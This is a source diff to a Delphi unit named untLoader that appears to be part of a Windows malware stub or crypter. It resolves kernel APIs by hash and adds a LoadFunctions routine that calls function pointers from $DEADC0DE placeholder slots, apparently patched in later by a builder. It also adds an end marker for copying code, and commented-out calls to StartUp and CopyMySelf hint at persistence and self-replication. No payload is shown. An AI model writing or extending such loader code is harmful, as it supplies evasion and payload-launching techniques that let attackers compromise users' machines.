@@ -1,27 +1,7 @@
 unit untLoader;
 
 interface
-uses Windows;
-
-type
-  TAPIRec = packed record
-    hKernel32, hUser32, hShell32, hShFolder : Cardinal;
-    xExitProcess:procedure(uExitCode: UINT); stdcall;
-    xLoadLibraryA:function(lpLibFileName: PChar): Cardinal; stdcall;
-    xMessageBoxW:function(hWnd: HWND; lpText, lpCaption: PWideChar; uType: UINT): Integer; stdcall;
-    xVirtualAlloc:function(lpvAddress: Pointer; dwSize, flAllocationType, flProtect: DWORD): Pointer; stdcall;
-    xGetModuleFileNameW:function(hModule: HINST; lpFilename: PWideChar; nSize: DWORD): DWORD; stdcall;
-    xlstrlenW:function(lpString: PWideChar): Integer; stdcall;
-    xlstrcmpW:function(lpString1, lpString2: PWideChar): Integer; stdcall;
-    xlstrcatW:function(lpString1, lpString2: PWideChar): PWideChar; stdcall;
-    xCopyFileW:function(lpExistingFileName, lpNewFileName: PWideChar; bFailIfExists: BOOL): BOOL; stdcall;
-    xShellExecuteW:function(hWnd: HWND; Operation, FileName, Parameters, Directory: PWideChar; ShowCmd: Integer): HINST; stdcall;
-    xSHGetFolderPathW:function(hwnd: HWND; csidl: Integer; hToken: THandle; dwFlags: DWORD; pszPath: PWideChar): HResult; stdcall;
-    xwsprintfW:function(Output: PWideChar; Format: PWideChar): Integer; cdecl varargs;
-    xAllocMem:function(pAPI:Pointer; dwSize:Cardinal):Pointer;stdcall;
-  end;
-  PAPIRec = ^TAPIRec;
-
+uses Windows, untUtils;
   
 procedure resolver;
 procedure resolver_start();
@@ -33,10 +13,31 @@ begin
 end;
 
 procedure resolver;
-  function AllocMem(pAPI:PAPIRec; dwSize:Cardinal):Pointer;stdcall;
+
+  procedure LoadFunctions(pAPI:PAPIRec);stdcall;
+  var
+    pFunctions:Array[0..2] of DWORD;
+    xFunc:procedure(pAPI:PAPIRec);stdcall;
+    i:Integer;
+  begin
+    pFunctions[0] := $DEADC0DE;
+    pFunctions[1] := $DEADC0DE;
+    pFunctions[2] := $DEADC0DE;
+    for i := 0 to Length(pFunctions) - 1 do
+    begin
+      if DWORD(pFunctions[i]) <> $DEADC0DE then
+      begin
+        xFunc := Pointer(pFunctions[i]);
+        xFunc(pAPI);
+      end;
+    end;
+  end;
+
+  function xAllocMem(pAPI:PAPIRec; dwSize:Cardinal):Pointer;stdcall;
   begin
     Result := pAPI.xVirtualAlloc(nil, dwSize, MEM_COMMIT, PAGE_READWRITE);
   end;
+  procedure xAllocMem_END();asm end;
 
   procedure LoadLib(pAPI:PAPIRec);stdcall;
   var
@@ -103,7 +104,6 @@ procedure resolver;
   procedure LoadAPIs(pAPI:PAPIRec; hKernel32:Cardinal);
   begin
     pAPI.hKernel32 := hKernel32;
-    pAPI.xAllocMem := @AllocMem;
     pAPI.xLoadLibraryA := GetProcAddressEx(hKernel32, $3FC1BD8D, 12);
     LoadLib(pAPI);
     pAPI.xExitProcess := GetProcAddressEx(hKernel32, $251097CC, 11);
@@ -143,6 +143,7 @@ begin
   pAPI := pVirtualAlloc(nil, SizeOf(TAPIRec) , MEM_COMMIT, PAGE_READWRITE);
   LoadAPIs(pAPI, hKernel32);
   pAPI.xMessageBoxW(0, nil, nil, 0);
+  LoadFunctions(pAPI);
   //StartUp(pAPI);
   //CopyMySelf(pAPI);
   //pAPI.xMessageBoxW(0, GetCurrentDir(pAPI), nil, 0);
